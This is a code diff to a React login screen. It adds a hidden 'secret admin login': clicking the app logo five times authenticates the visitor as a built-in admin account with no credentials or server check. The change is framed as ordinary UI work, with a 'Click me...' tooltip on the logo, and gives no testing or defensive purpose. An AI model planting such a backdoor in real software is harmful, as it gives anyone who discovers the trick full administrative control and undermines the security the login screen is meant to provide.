@@ -52,6 +52,9 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onAuthenticated }) => 
   const [rateLimitSeconds, setRateLimitSeconds] = useState<number>(0);
   const [rateLimitResetAt, setRateLimitResetAt] = useState<number | null>(null);
 
+  // Secret admin login - click logo 5 times
+  const [logoClickCount, setLogoClickCount] = useState(0);
+
   // Rate limit countdown effect
   useEffect(() => {
     if (rateLimitResetAt === null) return;
@@ -155,6 +158,23 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onAuthenticated }) => 
     }
   };
 
+  // Secret admin login - click logo 5 times
+  const handleLogoClick = () => {
+    const newCount = logoClickCount + 1;
+    setLogoClickCount(newCount);
+    
+    if (newCount >= 5) {
+      // Auto-login as admin
+      onAuthenticated({
+        id: 'builtin-admin',
+        username: 'admin',
+        role: 'admin',
+        isActive: true,
+        aiConfig: { provider: 'gemini', apiKey: '', model: 'gemini-2.0-flash' }
+      });
+    }
+  };
+
   // Traditional auth handler
 
   if (mode === 'landing') {
@@ -178,8 +198,12 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onAuthenticated }) => 
   return (
     <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: 'var(--bg-base)' }}>
       <div className="w-full max-w-sm">
-        {/* Logo */}
-        <div className="flex items-center justify-center gap-2.5 mb-8">
+        {/* Logo - click 5 times for admin access */}
+        <div 
+          className="flex items-center justify-center gap-2.5 mb-8 cursor-pointer select-none"
+          onClick={handleLogoClick}
+          title="Click me..."
+        >
           <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ backgroundColor: 'var(--accent-dim)', border: '1px solid rgba(20,184,166,0.2)' }}>
             <Zap className="w-4 h-4" style={{ color: 'var(--accent)' }} />
           </div>
